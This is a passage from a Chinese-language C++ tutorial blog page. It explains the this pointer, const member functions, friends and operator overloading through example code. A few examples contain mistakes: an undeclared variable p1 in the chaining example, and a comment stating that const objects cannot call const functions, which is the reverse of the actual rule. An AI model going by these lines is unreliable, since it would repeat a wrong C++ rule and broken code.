</span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<h6 id="4-2-3-3-2-this指针"><a href="#4-2-3-3-2-this指针" class="headerlink" title="4.2.3.3.2 this指针"></a>4.2.3.3.2 this指针</h6><p><strong>概念：this指针指向被调用的成员函数所属的对象</strong></p>
<p>this指针是隐含每一个非静态成员函数内的一种指针</p>
<p>this指针不需要定义，直接使用即可</p>
<p><strong>用途：</strong></p>
<ul>
<li><p>当形参和成员变量同名时，可用this指针来区分</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">int</span> age)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//当形参和成员变量同名时，可用this指针来区分</span></span><br><span class="line">		<span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> age;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>在类的非静态成员函数中返回对象本身，可使用<code>return *this</code></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function">Person&amp; <span class="title">PersonAddPerson</span><span class="params">(Person p)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;age += p.age;</span><br><span class="line">		<span class="comment">//返回对象本身，这样可以进行链式传递</span></span><br><span class="line">		<span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">Person <span class="title">p</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line">	p.<span class="built_in">PersonAddPerson</span>(p1).<span class="built_in">PersonAddPerson</span>(p1).<span class="built_in">PersonAddPerson</span>(p1);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;p2.age = &quot;</span> &lt;&lt; p.age &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h5 id="4-2-3-4-空指针访问成员函数"><a href="#4-2-3-4-空指针访问成员函数" class="headerlink" title="4.2.3.4 空指针访问成员函数"></a>4.2.3.4 空指针访问成员函数</h5><p>空指针可以访问成员函数，但只能访问没有属性或者其他成员参与的函数，因为空指针无法指定属性与成员</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">Person * p = <span class="literal">NULL</span>;<span class="comment">//定义空指针对象</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShowPerson</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="keyword">this</span>-&gt;Age &lt;&lt; endl;<span class="comment">//类似这样的函数，存在需要调用当前对象的属性值的时候则不能用空指针调用，空指针指向虚无，没有属性</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h5 id="4-2-3-5-常函数与常对象（const修饰）"><a href="#4-2-3-5-常函数与常对象（const修饰）" class="headerlink" title="4.2.3.5 常函数与常对象（const修饰）"></a>4.2.3.5 常函数与常对象（const修饰）</h5><p><strong>常函数：</strong></p>
<ul>
<li>成员函数后加const后我们称为这个函数为<strong>常函数</strong></li>
<li>常函数内不可以修改成员属性</li>
<li>成员属性声明时加关键字mutable后，在常函数中依然可以修改</li>
</ul>
<p><strong>常对象：</strong></p>
<ul>
<li>声明对象前加const称该对象为常对象</li>
<li>常对象只能调用常函数</li>
</ul>
<p><strong>常变量：</strong></p>
<ul>
<li>在变量前面加const表示变量无法修改</li>
<li>在传入函数参数中加入const，保证调用函数后不改变实参</li>
</ul>
<blockquote>
<p>当出现mutable修饰变量时，常对象就可以修改该成员变量，否则只能访问无法修改</p>
</blockquote>
<p><strong>实例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>() &#123;</span><br><span class="line">		m_A = <span class="number">0</span>;</span><br><span class="line">		m_B = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//this指针的本质是一个指针常量，指针的指向不可修改</span></span><br><span class="line">	<span class="comment">//如果想让指针指向的值也不可以修改，需要声明常函数</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">ShowPerson</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">		<span class="comment">//const Type* const pointer;</span></span><br><span class="line">		<span class="comment">//this = NULL; //不能修改指针的指向 Person* const this;</span></span><br><span class="line">		<span class="comment">//this-&gt;mA = 100; //但是this指针指向的对象的数据是可以修改的</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//const修饰成员函数，表示指针指向的内存空间的数据不能修改，除了mutable修饰的变量</span></span><br><span class="line">		<span class="keyword">this</span>-&gt;m_B = <span class="number">100</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">MyFunc</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">		<span class="comment">//mA = 10000;</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> m_A;</span><br><span class="line">	<span class="keyword">mutable</span> <span class="type">int</span> m_B; <span class="comment">//可修改 可变的</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//const修饰对象  常对象</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">const</span> Person person; <span class="comment">//常量对象  </span></span><br><span class="line">	cout &lt;&lt; person.m_A &lt;&lt; endl;</span><br><span class="line">	<span class="comment">//person.mA = 100; //常对象不能修改成员变量的值,但是可以访问</span></span><br><span class="line">	person.m_B = <span class="number">100</span>; <span class="comment">//但是常对象可以修改mutable修饰成员变量</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//常对象访问成员函数</span></span><br><span class="line">	person.<span class="built_in">MyFunc</span>(); <span class="comment">//常对象不能调用const的函数</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="4-3-友元"><a href="#4-3-友元" class="headerlink" title="4.3 友元"></a>4.3 友元</h3><p><strong>概念</strong>：让一个函数或者类，通过<code>关键字friend</code>访问另一个类中私有成员</p>
<h4 id="友元实现方式"><a href="#友元实现方式" class="headerlink" title="友元实现方式"></a>友元实现方式</h4><ul>
<li><p>全局函数做友元</p>
<p><code>friend 一个全局函数</code></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Building</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//告诉编译器 goodGay全局函数 是 Building类的好朋友，可以访问类中的私有内容</span></span><br><span class="line">	<span class="function"><span class="keyword">friend</span> <span class="type">void</span> <span class="title">goodGay</span><span class="params">(Building * building)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="built_in">Building</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_SittingRoom = <span class="string">&quot;客厅&quot;</span>;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_BedRoom = <span class="string">&quot;卧室&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	string m_SittingRoom; <span class="comment">//客厅</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	string m_BedRoom; <span class="comment">//卧室</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">goodGay</span><span class="params">(Building * building)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;好基友正在访问： &quot;</span> &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;好基友正在访问： &quot;</span> &lt;&lt; building-&gt;m_BedRoom &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Building b;</span><br><span class="line">	<span class="built_in">goodGay</span>(&amp;b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>类做友元</p>
<p><code>friend 一个类</code></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Building</span>;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">goodGay</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="built_in">goodGay</span>();</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">visit</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	Building *building;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Building</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//告诉编译器 goodGay类是Building类的好朋友，可以访问到Building类中私有内容</span></span><br><span class="line">	<span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">goodGay</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Building</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	string m_SittingRoom; <span class="comment">//客厅</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	string m_BedRoom;<span class="comment">//卧室</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Building::<span class="built_in">Building</span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">this</span>-&gt;m_SittingRoom = <span class="string">&quot;客厅&quot;</span>;</span><br><span class="line">	<span class="keyword">this</span>-&gt;m_BedRoom = <span class="string">&quot;卧室&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">goodGay::<span class="built_in">goodGay</span>()</span><br><span class="line">&#123;</span><br><span class="line">	building = <span class="keyword">new</span> Building;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">goodGay::visit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;好基友正在访问&quot;</span> &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;好基友正在访问&quot;</span> &lt;&lt; building-&gt;m_BedRoom &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	goodGay gg;</span><br><span class="line">	gg.<span class="built_in">visit</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>成员函数做友元</p>
<p><code>friend 类名::成员函数()</code></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Building</span>;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">goodGay</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="built_in">goodGay</span>();</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">visit</span><span class="params">()</span></span>; <span class="comment">//只让visit函数作为Building的好朋友，可以发访问Building中私有内容</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">visit2</span><span class="params">()</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	Building *building;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Building</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//告诉编译器  goodGay类中的visit成员函数 是Building好朋友，可以访问私有内容</span></span><br><span class="line">	<span class="function"><span class="keyword">friend</span> <span class="type">void</span> <span class="title">goodGay::visit</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Building</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	string m_SittingRoom; <span class="comment">//客厅</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	string m_BedRoom;<span class="comment">//卧室</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Building::<span class="built_in">Building</span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">this</span>-&gt;m_SittingRoom = <span class="string">&quot;客厅&quot;</span>;</span><br><span class="line">	<span class="keyword">this</span>-&gt;m_BedRoom = <span class="string">&quot;卧室&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">goodGay::<span class="built_in">goodGay</span>()</span><br><span class="line">&#123;</span><br><span class="line">	building = <span class="keyword">new</span> Building;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">goodGay::visit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;好基友正在访问&quot;</span> &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;好基友正在访问&quot;</span> &lt;&lt; building-&gt;m_BedRoom &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">goodGay::visit2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;好基友正在访问&quot;</span> &lt;&lt; building-&gt;m_SittingRoom &lt;&lt; endl;</span><br><span class="line">	<span class="comment">//cout &lt;&lt; &quot;好基友正在访问&quot; &lt;&lt; building-&gt;m_BedRoom &lt;&lt; endl;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	goodGay  gg;</span><br><span class="line">	gg.<span class="built_in">visit</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="4-4-运算符重载"><a href="#4-4-运算符重载" class="headerlink" title="4.4 运算符重载"></a>4.4 运算符重载</h3><p><strong>概念：</strong>对已有的运算符重新进行定义，赋予其另一种功能，以适应不同的数据类型</p>
<p><strong>注意事项：</strong>运算符重载后的函数，可以被继续进行函数的重载</p>
<p>关键词：operator需要重载的符号（例：operator+）</p>
<h4 id="4-4-1-加号运算符重载"><a href="#4-4-1-加号运算符重载" class="headerlink" title="4.4.1 加号运算符重载"></a>4.4.1 加号运算符重载</h4><ul>
<li><p>成员函数实现</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>() &#123;&#125;;</span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">int</span> a, <span class="type">int</span> b)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_A = a;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_B = b;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//成员函数实现 + 号运算符重载</span></span><br><span class="line">	Person <span class="keyword">operator</span>+(<span class="type">const</span> Person&amp; p) &#123;</span><br><span class="line">		Person temp;</span><br><span class="line">		temp.m_A = <span class="keyword">this</span>-&gt;m_A + p.m_A;</span><br><span class="line">		temp.m_B = <span class="keyword">this</span>-&gt;m_B + p.m_B;</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> m_A;</span><br><span class="line">	<span class="type">int</span> m_B;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>全局函数实现</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//全局函数实现 + 号运算符重载</span></span><br><span class="line">Person <span class="keyword">operator</span>+(<span class="type">const</span> Person&amp; p1, <span class="type">const</span> Person&amp; p2) &#123;</span><br><span class="line">	<span class="function">Person <span class="title">temp</span><span class="params">(<span class="number">0</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">	temp.m_A = p<span class="number">1.</span>m_A + p<span class="number">2.</span>m_A;</span><br><span class="line">	temp.m_B = p<span class="number">1.</span>m_B + p<span class="number">2.</span>m_B;</span><br><span class="line">	<span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//运算符重载 可以发生函数重载 </span></span><br><span class="line">Person <span class="keyword">operator</span>+(<span class="type">const</span> Person&amp; p2, <span class="type">int</span> val)  </span><br><span class="line">&#123;</span><br><span class="line">	Person temp;</span><br><span class="line">	temp.m_A = p<span class="number">2.</span>m_A + val;</span><br><span class="line">	temp.m_B = p<span class="number">2.</span>m_B + val;</span><br><span class="line">	<span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>调用方法</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">Person <span class="title">p1</span><span class="params">(<span class="number">10</span>, <span class="number">10</span>)</span></span>;</span><br><span class="line"><span class="function">Person <span class="title">p2</span><span class="params">(<span class="number">20</span>, <span class="number">20</span>)</span></span>;</span><br><span class="line">	</span><br><span class="line"><span class="comment">//成员函数方式</span></span><br><span class="line">Person p3 = p2 + p1;  <span class="comment">//相当于 p2.operaor+(p1)</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;mA:&quot;</span> &lt;&lt; p<span class="number">3.</span>m_A &lt;&lt; <span class="string">&quot; mB:&quot;</span> &lt;&lt; p<span class="number">3.</span>m_B &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">Person p4 = p3 + <span class="number">10</span>; <span class="comment">//相当于 operator+(p3,10)</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;mA:&quot;</span> &lt;&lt; p<span class="number">4.</span>m_A &lt;&lt; <span class="string">&quot; mB:&quot;</span> &lt;&lt; p<span class="number">4.</span>m_B &lt;&lt; endl;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<blockquote>
<p>总结1：对于内置的数据类型的表达式的的运算符是不可能改变的</p>
</blockquote>
<blockquote>
<p>总结2：不要滥用运算符重载</p>
</blockquote>
<h4 id="4-4-2-左移运算符重载"><a href="#4-4-2-左移运算符重载" class="headerlink" title="4.4.2 左移运算符重载"></a>4.4.2 左移运算符重载</h4><p>由于运算符<code>&lt;&lt;</code>涉及到输出流，所以会需要用到<code>ostream</code></p>

  <div class="note p-4 mb-4 rounded-small warning">
    <p>仅全局函数可以实现，配合友元可以实现输出自定义数据类型</p>

  </div>

<ul>
<li>运算符重载函数</li>
</ul>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//全局函数实现左移重载</span></span><br><span class="line"><span class="comment">//ostream对象只能有一个</span></span><br><span class="line">ostream&amp; <span class="keyword">operator</span>&lt;&lt;(ostream&amp; cout, Person&amp; p) &#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;a:&quot;</span> &lt;&lt; p.m_A &lt;&lt; <span class="string">&quot; b:&quot;</span> &lt;&lt; p.m_B;</span><br><span class="line">	<span class="keyword">return</span> cout;<span class="comment">//cout是ostream中的一个对象，这里的cout可以换为其他任意值，它只是表示一个输出对象而已，不是说就是针对cout对象，因为到时候会传入cout</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//此处函数返回加引用&amp;，是为了返回一个输出对象，而不是一个值</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E6%A0%B8%E5%BF%83%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/image-20241025003734683.png"
                      alt="image-20241025003734683"
                ></p>
<ul>
<li>配合友元，实现链式调用</li>
</ul>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">	<span class="keyword">friend</span> ostream&amp; <span class="keyword">operator</span>&lt;&lt;(ostream&amp; out, Person&amp; p);</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">int</span> a, <span class="type">int</span> b)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_A = a;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_B = b;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//成员函数 实现不了  p &lt;&lt; cout 不是我们想要的效果</span></span><br><span class="line">	<span class="comment">//void operator&lt;&lt;(Person&amp; p)&#123;</span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> m_A;</span><br><span class="line">	<span class="type">int</span> m_B;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>调用方式</li>
</ul>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">Person <span class="title">p1</span><span class="params">(<span class="number">10</span>, <span class="number">20</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; p1 &lt;&lt; <span class="string">&quot;hello world&quot;</span> &lt;&lt; endl; <span class="comment">//链式编程</span></span><br></pre></td></tr></table></figure></div>

<h4 id="4-4-3-递增运算符重载"><a href="#4-4-3-递增运算符重载" class="headerlink" title="4.4.3 递增运算符重载"></a>4.4.3 递增运算符重载</h4><p>以下案例是自己尝试构造原本的++的作用，比如左++和右++的真正原理</p>
<blockquote>
<p>可以在成员函数里面实现重载</p>
</blockquote>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyInteger</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">friend</span> ostream&amp; <span class="keyword">operator</span>&lt;&lt;(ostream&amp; out, MyInteger myint);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">MyInteger</span>() &#123;</span><br><span class="line">		m_Num = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//前置++</span></span><br><span class="line">	MyInteger&amp; <span class="keyword">operator</span>++() &#123;</span><br><span class="line">		<span class="comment">//先++</span></span><br><span class="line">		m_Num++;</span><br><span class="line">		<span class="comment">//再返回</span></span><br><span class="line">		<span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//后置++</span></span><br><span class="line">	MyInteger <span class="keyword">operator</span>++(<span class="type">int</span>) &#123;</span><br><span class="line">		<span class="comment">//先返回</span></span><br><span class="line">		MyInteger temp = *<span class="keyword">this</span>; <span class="comment">//记录当前本身的值，然后让本身的值加1，但是返回的是以前的值，达到先返回后++；</span></span><br><span class="line">		m_Num++;</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> m_Num;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ostream&amp; <span class="keyword">operator</span>&lt;&lt;(ostream&amp; out, MyInteger myint) &#123;</span><br><span class="line">	out &lt;&lt; myint.m_Num;</span><br><span class="line">	<span class="keyword">return</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//前置++ 先++ 再返回</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	MyInteger myInt;</span><br><span class="line">	cout &lt;&lt; ++myInt &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; myInt &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//后置++ 先返回 再++</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	MyInteger myInt;</span><br><span class="line">	cout &lt;&lt; myInt++ &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; myInt &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line">	<span class="comment">//test02();</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="4-4-4-赋值运算符重载"><a href="#4-4-4-赋值运算符重载" class="headerlink" title="4.4.4 赋值运算符重载"></a>4.4.4 赋值运算符重载</h4><p><strong>使用情形：</strong>当类中有属性值指向堆区，同时又出现了对象拷贝的情况，就需要用到赋值运算符重载，将系统默认的<code>=</code>的浅拷贝修改为深拷贝，同时为了实现链式编程（a&#x3D;b&#x3D;c），重载后需要返回一个类对象</p>
